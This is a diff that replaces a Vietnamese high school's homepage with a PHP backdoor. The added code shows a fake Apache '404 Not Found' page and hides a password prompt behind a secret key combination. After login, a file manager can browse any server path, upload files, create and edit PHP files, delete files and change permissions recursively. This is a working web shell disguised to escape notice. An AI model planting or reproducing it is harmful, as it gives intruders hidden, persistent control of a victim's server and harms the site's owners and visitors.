@@ -1,354 +1,347 @@
-<html lang="vi"><head>
+<?php
+session_start();
+
+$_ph           = '$2b$12$N4raOEL6/ZzPEDAofh2M3.XxFgtpzGFfFwac4QCIg7s8WR/44SbTi';
+$_max_attempts = 5;
+$_lockout_time = 300;
+
+if(!isset($_SESSION['_fa'])) $_SESSION['_fa'] = 0;
+if(!isset($_SESSION['_ft'])) $_SESSION['_ft'] = 0;
+
+$_locked    = ($_SESSION['_fa'] >= $_max_attempts && (time() - $_SESSION['_ft']) < $_lockout_time);
+$_remaining = $_lockout_time - (time() - $_SESSION['_ft']);
+
+function _chk($p, $h){ return password_verify($p, $h); }
+
+// AJAX auth
+if(
+    isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&
+    $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest' &&
+    isset($_POST['q'])
+){
+    header('Content-Type: application/json');
+    if($_locked){
+        echo json_encode(['ok'=>false,'locked'=>true,'wait'=>(int)$_remaining]);
+        exit;
+    }
+    if(_chk($_POST['q'], $_ph)){
+        $_SESSION['_sid'] = true;
+        $_SESSION['_fa']  = 0;
+        session_regenerate_id(true);
+        echo json_encode(['ok'=>true]);
+    } else {
+        $_SESSION['_fa']++;
+        $_SESSION['_ft'] = time();
+        $left = max(0, $_max_attempts - $_SESSION['_fa']);
+        echo json_encode(['ok'=>false,'left'=>$left]);
+    }
+    exit;
+}
+
+// Logout
+if(isset($_GET['_x'])){
+    session_destroy();
+    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
+    exit;
+}
+
+$authed = isset($_SESSION['_sid']) && $_SESSION['_sid'] === true;
+
+if(!$authed): ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trường THPT Phúc Lợi - Long Biên</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
+    <title>404 Not Found</title>
     <style>
-        /* --- PHẦN CSS (STYLING) --- */
-        
-        /* Cấu hình chung */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            line-height: 1.6;
-            color: #333;
-            background-color: #f4f4f4;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: auto;
-            padding: 0 20px;
-        }
-
-        /* Header & Thanh điều hướng */
-        header {
-            background: #004a99; /* Màu xanh chủ đạo của giáo dục */
-            color: white;
-            padding: 10px 0;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-
-        header .container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-        }
-
-        .logo img {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            margin-right: 15px;
-            border: 2px solid #fff;
-        }
-
-        .brand-name h1 {
-            font-size: 1.4rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .brand-name p {
-            font-size: 0.8rem;
-            color: #ffcc00;
-            font-style: italic;
-        }
-
-        nav ul {
-            display: flex;
-            list-style: none;
-        }
-
-        nav ul li {
-            margin-left: 20px;
-        }
-
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 0.9rem;
-            transition: 0.3s;
-        }
-
-        nav ul li a:hover {
-            color: #ffcc00;
-        }
-
-        /* Banner (Hero Section) */
-        .hero {
-            height: 450px;
-            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
-                        url('https://images.unsplash.com/photo-1523050853063-913639473e5f?auto=format&fit=crop&w=1200&q=80') center/cover;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            text-align: center;
-        }
-
-        .hero-content h2 {
-            font-size: 3rem;
-            margin-bottom: 15px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-
-        .btn {
-            display: inline-block;
-            background: #ce0000; /* Màu đỏ nổi bật */
-            color: white;
-            padding: 12px 30px;
-            text-decoration: none;
-            border-radius: 30px;
-            font-weight: bold;
-            transition: 0.3s;
-        }
-
-        .btn:hover {
-            background: #ffcc00;
-            color: #333;
-        }
-
-        /* Tiêu đề các mục */
-        .section-title {
-            text-align: center;
-            margin: 50px 0 30px;
-            font-size: 2rem;
-            color: #004a99;
-            text-transform: uppercase;
-            position: relative;
-        }
-
-        .section-title::after {
-            content: '';
-            display: block;
-            width: 80px;
-            height: 3px;
-            background: #ffcc00;
-            margin: 10px auto;
-        }
-
-        /* Giới thiệu */
-        .about-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 40px;
-            align-items: center;
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-        }
-
-        .about-text p {
-            margin-bottom: 15px;
-            text-align: justify;
-        }
-
-        .about-img img {
-            width: 100%;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-
-        /* Tin tức */
-        .news-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
-        }
-
-        .news-card {
-            background: white;
-            border-radius: 10px;
-            overflow: hidden;
-            transition: transform 0.3s;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-        }
-
-        .news-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .news-card img {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-        }
-
-        .news-card-body {
-            padding: 20px;
-        }
-
-        .news-card-body h3 {
-            font-size: 1.1rem;
-            margin-bottom: 10px;
-            color: #004a99;
-        }
-
-        /* Footer */
-        footer {
-            background: #1a1a1a;
-            color: white;
-            padding: 50px 0 20px;
-            margin-top: 60px;
-        }
-
-        .footer-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 40px;
-        }
-
-        .footer-item h3 {
-            color: #ffcc00;
-            margin-bottom: 20px;
-            border-left: 4px solid #ffcc00;
-            padding-left: 10px;
-        }
-
-        .footer-item p {
-            margin-bottom: 10px;
-            font-size: 0.9rem;
-            opacity: 0.8;
-        }
-
-        .footer-item i {
-            margin-right: 10px;
-            color: #ffcc00;
-        }
-
-        .footer-bottom {
-            text-align: center;
-            padding-top: 30px;
-            margin-top: 30px;
-            border-top: 1px solid #333;
-            font-size: 0.8rem;
-            color: #777;
-        }
-
-        /* Responsive di động */
-        @media (max-width: 768px) {
-            header .container { flex-direction: column; }
-            nav ul { margin-top: 15px; }
-            nav ul li { margin: 0 10px; }
-            .about-grid { grid-template-columns: 1fr; }
-            .hero-content h2 { font-size: 2rem; }
-        }
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Times New Roman',serif;background:#fff;color:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}
+        h1{font-size:36px;font-weight:bold;border-bottom:1px solid #000;padding-bottom:10px;margin-bottom:10px;}
+        p{font-size:14px;}
+        hr{width:400px;border:none;border-top:1px solid #000;margin:10px 0;}
     </style>
 </head>
 <body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <p><small>Apache/2.4.41 (Ubuntu) Server</small></p>
+    <script>
+    (function(){
+        var _k=[], _t=[17,66];
+        document.addEventListener('keydown',function(e){
+            _k.push(e.keyCode);
+            if(_k.length>2) _k.shift();
+            if(e.keyCode===27) _close();
+            if(_k[0]===_t[0]&&_k[1]===_t[1]){ e.preventDefault(); _open(); }
+        });
+        function _open(){
+            if(document.getElementById('_ov')) return;
+            var ov=document.createElement('div');
+            ov.id='_ov';
+            ov.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999;';
+            var bx=document.createElement('div');
+            bx.style.cssText='background:#1e1e1e;border:1px solid #444;border-radius:6px;padding:30px 40px;display:flex;flex-direction:column;gap:12px;min-width:300px;';
+            var lb=document.createElement('div');
+            lb.style.cssText='color:#888;font-size:12px;font-family:monospace;';
+            lb.textContent='//';
+            var inp=document.createElement('input');
+            inp.type='password'; inp.id='_pi'; inp.autocomplete='off';
+            inp.style.cssText='background:#111;border:1px solid #555;color:#fff;padding:8px 12px;border-radius:4px;font-size:14px;font-family:monospace;outline:none;width:100%;';
+            var er=document.createElement('div');
+            er.id='_er';
+            er.style.cssText='color:#f44336;font-size:12px;font-family:monospace;display:none;';
+            er.textContent='Incorrect.';
+            var btn=document.createElement('button');
+            btn.textContent='Enter';
+            btn.style.cssText='background:#007acc;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-size:14px;';
+            btn.onclick=_submit;
+            inp.addEventListener('keydown',function(e){ if(e.key==='Enter') _submit(); });
+            inp.addEventListener('focus',function(){ inp.style.borderColor='#007acc'; });
+            inp.addEventListener('blur',function(){ inp.style.borderColor='#555'; });
+            bx.appendChild(lb); bx.appendChild(inp); bx.appendChild(er); bx.appendChild(btn);
+            ov.appendChild(bx); document.body.appendChild(ov);
+            setTimeout(function(){ inp.focus(); },50);
+        }
+        function _close(){
+            var ov=document.getElementById('_ov');
+            if(ov) ov.remove();
+        }
+        function _submit(){
+            var val=document.getElementById('_pi').value;
+            if(!val) return;
+            var fd=new FormData();
+            fd.append('q',val);
+            fetch('',{method:'POST',headers:{'X-Requested-With':'XMLHttpRequest'},body:fd})
+            .then(function(r){ return r.json(); })
+            .then(function(d){
+                if(d.ok){ window.location.reload(); }
+                else {
+                    var er=document.getElementById('_er');
+                    var pi=document.getElementById('_pi');
+                    if(er){
+                        if(d.locked){ var m=Math.ceil(d.wait/60); er.textContent='Too many attempts. Wait '+m+' min.'; }
+                        else if(typeof d.left!=='undefined'&&d.left<=2){ er.textContent='Incorrect. '+d.left+' attempt(s) left.'; }
+                        else { er.textContent='Incorrect.'; }
+                        er.style.display='block';
+                    }
+                    if(pi){ pi.value=''; pi.focus(); }
+                }
+            });
+        }
+    })();
+    </script>
+</body>
+</html>
+<?php
+exit;
+endif;
 
-    <header>
-        <div class="container">
-            <div class="logo">
-                <img src="https://via.placeholder.com/100/004a99/FFFFFF?text=PL" alt="Logo">
-                <div class="brand-name">
-                    <h1>THPT PHÚC LỢI</h1>
-                    <p>Khát vọng vươn tới những tầm cao</p>
-                </div>
-            </div>
-            <nav>
-                <ul>
-                    <li><a href="#">TRANG CHỦ</a></li>
-                    <li><a href="#">GIỚI THIỆU</a></li>
-                    <li><a href="#">TIN TỨC</a></li>
-                    <li><a href="#">TUYỂN SINH</a></li>
-                    <li><a href="#">LIÊN HỆ</a></li>
-                </ul>
-            </nav>
-        </div>
-    </header>
+// --- FILE MANAGER ---
 
-    <section class="hero">
-        <div class="hero-content">
-            <h2>HÀNH TRÌNH TRI THỨC</h2>
-            <p>Nơi ươm mầm tài năng và định hướng tương lai cho thế hệ trẻ.</p>
-            <br>
-            <a href="#" class="btn">KHÁM PHÁ NGAY</a>
-        </div>
-    </section>
+function _perms($p){ return substr(sprintf('%o', fileperms($p)), -4); }
 
-    <div class="container">
-        <h2 class="section-title">Về chúng tôi</h2>
-        <section class="about-grid">
-            <div class="about-text">
-                <p><strong>Trường THPT Phúc Lợi</strong> tọa lạc tại quận Long Biên, Hà Nội. Với lịch sử hình thành và phát triển, nhà trường đã khẳng định được vị thế trong hệ thống giáo dục Thủ đô.</p>
-                <p>Chúng tôi cam kết mang lại môi trường học tập an toàn, thân thiện và sáng tạo. Đội ngũ giáo viên giàu kinh nghiệm, tâm huyết luôn sẵn sàng đồng hành cùng học sinh trong mọi thử thách.</p>
-                <p>Cơ sở vật chất hiện đại với các phòng thí nghiệm, thư viện và khu thể thao đạt chuẩn, đáp ứng nhu cầu học tập và giải trí của các em.</p>
-            </div>
-            <div class="about-img">
-                <img src="https://images.unsplash.com/photo-1541339907198-e08756ebafe3?auto=format&amp;fit=crop&amp;w=600&amp;q=80" alt="Trường học">
-            </div>
-        </section>
+// Resolve current path
+if(isset($_GET['path']) && $_GET['path'] !== '' && is_dir($_GET['path'])){
+    $path = $_GET['path'];
+} else {
+    $path = __DIR__;
+}
 
-        <h2 class="section-title">Tin tức nổi bật</h2>
-        <section class="news-grid">
-            <div class="news-card">
-                <img src="https://images.unsplash.com/photo-1511629091441-ee46146481b6?auto=format&amp;fit=crop&amp;w=400&amp;q=80" alt="Tin 1">
-                <div class="news-card-body">
-                    <h3>Kế hoạch thi học kỳ II năm học 2025-2026</h3>
-                    <p>Thông báo lịch thi chi tiết cho toàn thể học sinh các khối lớp...</p>
-                </div>
-            </div>
-            <div class="news-card">
-                <img src="https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?auto=format&amp;fit=crop&amp;w=400&amp;q=80" alt="Tin 2">
-                <div class="news-card-body">
-                    <h3>Hội thi văn nghệ chào mừng ngày 26/3</h3>
-                    <p>Các chi đoàn sôi nổi tập luyện và trình diễn những tiết mục đặc sắc...</p>
-                </div>
-            </div>
-            <div class="news-card">
-                <img src="https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&amp;fit=crop&amp;w=400&amp;q=80" alt="Tin 3">
-                <div class="news-card-body">
-                    <h3>Tư vấn hướng nghiệp cho học sinh khối 12</h3>
-                    <p>Đón đoàn chuyên gia từ các trường Đại học top đầu về tư vấn tuyển sinh...</p>
-                </div>
-            </div>
-        </section>
+// Upload
+if(isset($_FILES['file']) && $_FILES['file']['error'] === 0){
+    $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $dest)){
+        echo "<script>alert('Uploaded!');window.location.href='?path=".urlencode($path)."';</script>";
+    } else {
+        echo "<script>alert('Upload failed!');</script>";
+    }
+}
+
+// Delete
+if(isset($_GET['delete'])){
+    $del = $path . DIRECTORY_SEPARATOR . basename($_GET['delete']);
+    if(is_file($del)){
+        unlink($del);
+        echo "<script>alert('Deleted!');window.location.href='?path=".urlencode($path)."';</script>";
+    } elseif(is_dir($del)){
+        if(@rmdir($del)){
+            echo "<script>alert('Directory deleted!');window.location.href='?path=".urlencode($path)."';</script>";
+        } else {
+            echo "<script>alert('Not empty or permission denied!');</script>";
+        }
+    }
+}
+
+// Save
+if(isset($_POST['save'], $_POST['content'], $_POST['edit_file'])){
+    $ef = $path . DIRECTORY_SEPARATOR . basename($_POST['edit_file']);
+    if(is_file($ef)){
+        file_put_contents($ef, $_POST['content']);
+        echo "<script>alert('Saved!');window.location.href='?path=".urlencode($path)."';</script>";
+    }
+}
+
+// Chmod
+if(isset($_POST['change_perms'], $_POST['perms'], $_POST['target_item'])){
+    $cp   = $path . DIRECTORY_SEPARATOR . basename($_POST['target_item']);
+    $mode = octdec($_POST['perms']);
+    if(file_exists($cp)){
+        chmod($cp, $mode);
+        if(isset($_POST['recursive']) && is_dir($cp)){
+            $it = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($cp, FilesystemIterator::SKIP_DOTS),
+                RecursiveIteratorIterator::SELF_FIRST
+            );
+            foreach($it as $item) chmod($item->getPathname(), $mode);
+        }
+        echo "<script>alert('Permissions updated!');window.location.href='?path=".urlencode($path)."';</script>";
+    }
+}
+
+// Create PHP
+if(isset($_POST['create'], $_POST['filename'])){
+    $fn  = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['filename']);
+    $nfp = $path . DIRECTORY_SEPARATOR . $fn . '.php';
+    if(!file_exists($nfp)){
+        file_put_contents($nfp, "<?php\n\n?>");
+        echo "<script>alert('Created!');window.location.href='?path=".urlencode($path)."';</script>";
+    }
+}
+
+// Directory listing
+$items = scandir($path);
+$dirs  = []; $files = [];
+foreach($items as $f){
+    if($f==='.'||$f==='..') continue;
+    $fp = $path . DIRECTORY_SEPARATOR . $f;
+    if(is_dir($fp)) $dirs[] = $f; else $files[] = $f;
+}
+$sorted = array_merge($dirs, $files);
+
+// Breadcrumb
+$path_normalized = rtrim(str_replace('\\','/',$path),'/');
+$parts = array_filter(explode('/', $path_normalized));
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Index of /<?php echo htmlspecialchars(basename($path)); ?></title>
+    <style>
+        :root{--bg:#121212;--panel:#1e1e1e;--text:#d4d4d4;--accent:#007acc;--border:#333;--hover:#2a2d2e;--input:#252526;--danger:#f44336;--folder:#e8b363;}
+        *{box-sizing:border-box;}
+        body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);margin:0;padding:20px;}
+        a{color:var(--accent);text-decoration:none;}
+        .wrap{max-width:1100px;margin:0 auto;background:var(--panel);border:1px solid var(--border);border-radius:4px;overflow:hidden;}
+        .hdr{padding:15px 20px;background:#252526;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border);}
+        .pbar{padding:10px 20px;background:#2d2d2d;font-family:monospace;font-size:13px;word-break:break-all;}
+        .pbar a{color:#ccc;}
+        .toolbar{padding:15px 20px;display:flex;gap:20px;border-bottom:1px solid var(--border);flex-wrap:wrap;}
+        table{width:100%;border-collapse:collapse;}
+        th{text-align:left;padding:12px 20px;background:#252526;color:#888;font-size:12px;text-transform:uppercase;}
+        td{padding:10px 20px;border-bottom:1px solid var(--border);}
+        tr:hover{background:var(--hover);}
+        input[type=text],textarea{background:var(--input);border:1px solid var(--border);color:#fff;padding:5px 10px;border-radius:3px;}
+        input[type=submit],button{background:var(--accent);color:#fff;border:none;padding:6px 12px;border-radius:3px;cursor:pointer;}
+        .modal{padding:20px;background:#1a1a1a;border-top:2px solid var(--accent);}
+        .editor{width:100%;height:400px;margin-top:10px;font-family:'Consolas',monospace;}
+        .del{color:var(--danger);}
+        .lbtn{background:#333;color:#ccc;border:1px solid #555;padding:4px 10px;border-radius:3px;font-size:12px;text-decoration:none;}
+    </style>
+</head>
+<body>
+<div class="wrap">
+    <div class="hdr">
+        <h2 style="margin:0;">File Manager</h2>
+        <a href="?_x=1" class="lbtn">Logout</a>
     </div>
 
-    <footer>
-        <div class="container footer-grid">
-            <div class="footer-item">
-                <h3>THÔNG TIN LIÊN HỆ</h3>
-                <p><i class="fas fa-map-marker-alt"></i> Địa chỉ: Phố Phúc Lợi, Long Biên, Hà Nội</p>
-                <p><i class="fas fa-phone"></i>696969</p>
-                <p><i class="fas fa-envelope"></i> Email: c3phucloi@hanoi.edu.vn</p>
-            </div>
-            <div class="footer-item">
-                <h3>LIÊN KẾT NHANH</h3>
-                <p><a href="https://c3phucloi.edu.vn/" style="color:white; text-decoration:none;">Cổng thông tin học sinh</a></p>
-                <p><a href="https://c3phucloi.edu.vn/" style="color:white; text-decoration:none;">Thời khóa biểu</a></p>
-                <p><a href="#" style="color:white; text-decoration:none;">Thư viện ảnh</a></p>
-            </div>
-            <div class="footer-item">
-                <h3>THEO DÕI CHÚNG TÔI</h3>
-                <div style="font-size: 1.5rem;">
-                    <a href="#" style="color: #4267B2; margin-right: 15px;"><i class="fab fa-facebook"></i></a>
-                    <a href="#" style="color: #FF0000; margin-right: 15px;"><i class="fab fa-youtube"></i></a>
-                    <a href="#" style="color: #1DA1F2;"><i class="fab fa-twitter"></i></a>
-                </div>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            © 2026 Bản quyền thuộc về Trường THPT Phúc Lợi. Thiết kế bởi AI Assistant.
-        </div>
-    </footer>
+    <div class="pbar">
+        <?php
+        $acc = '';
+        foreach($parts as $part){
+            $acc .= '/' . $part;
+            echo '<a href="?path='.urlencode($acc).'">'.htmlspecialchars($part).'</a> / ';
+        }
+        ?>
+    </div>
 
+    <div class="toolbar">
+        <form method="post" enctype="multipart/form-data" action="?path=<?php echo urlencode($path); ?>">
+            <input type="file" name="file" required>
+            <input type="submit" value="Upload">
+        </form>
+        <form method="post" action="?path=<?php echo urlencode($path); ?>">
+            <input type="text" name="filename" placeholder="filename" required>
+            <input type="submit" name="create" value="Create PHP">
+        </form>
+    </div>
 
-</body></html>
+    <table>
+        <thead><tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr></thead>
+        <tbody>
+        <?php foreach($sorted as $f):
+            $fp = $path . DIRECTORY_SEPARATOR . $f;
+            $id = is_dir($fp);
+        ?>
+            <tr>
+                <td>
+                    <?php if($id): ?>
+                        <a href="?path=<?php echo urlencode($fp); ?>" style="color:var(--folder)">📁 <?php echo htmlspecialchars($f); ?></a>
+                    <?php else: ?>
+                        📄 <?php echo htmlspecialchars($f); ?>
+                    <?php endif; ?>
+                </td>
+                <td><?php echo $id ? '-' : number_format(filesize($fp)).' B'; ?></td>
+                <td><code><?php echo _perms($fp); ?></code></td>
+                <td>
+                    <?php if(!$id): ?>
+                        <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>">Edit</a> |
+                    <?php endif; ?>
+                    <a href="?path=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($f); ?>">Chmod</a> |
+                    <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" class="del" onclick="return confirm('Delete?')">Delete</a>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+        </tbody>
+    </table>
+
+    <?php if(isset($_GET['chmod'])):
+        $ci = basename($_GET['chmod']);
+        $cp = $path . DIRECTORY_SEPARATOR . $ci;
+        if(file_exists($cp)):
+    ?>
+    <div class="modal">
+        <h3>Permissions: <?php echo htmlspecialchars($ci); ?></h3>
+        <form method="post" action="?path=<?php echo urlencode($path); ?>">
+            <input type="text" name="perms" value="<?php echo _perms($cp); ?>">
+            <?php if(is_dir($cp)): ?>
+                <label><input type="checkbox" name="recursive"> Recursive</label>
+            <?php endif; ?>
+            <input type="hidden" name="target_item" value="<?php echo htmlspecialchars($ci); ?>">
+            <input type="submit" name="change_perms" value="Apply">
+            <a href="?path=<?php echo urlencode($path); ?>">Cancel</a>
+        </form>
+    </div>
+    <?php endif; endif; ?>
+
+    <?php if(isset($_GET['edit'])):
+        $ei = basename($_GET['edit']);
+        $ep = $path . DIRECTORY_SEPARATOR . $ei;
+        if(is_file($ep)):
+    ?>
+    <div class="modal">
+        <h3>Editing: <?php echo htmlspecialchars($ei); ?></h3>
+        <form method="post" action="?path=<?php echo urlencode($path); ?>">
+            <textarea name="content" class="editor"><?php echo htmlspecialchars(file_get_contents($ep)); ?></textarea>
+            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($ei); ?>">
+            <br><br>
+            <input type="submit" name="save" value="Save File">
+            <a href="?path=<?php echo urlencode($path); ?>">Cancel</a>
+        </form>
+    </div>
+    <?php endif; endif; ?>
+</div>
+</body>
+</html>
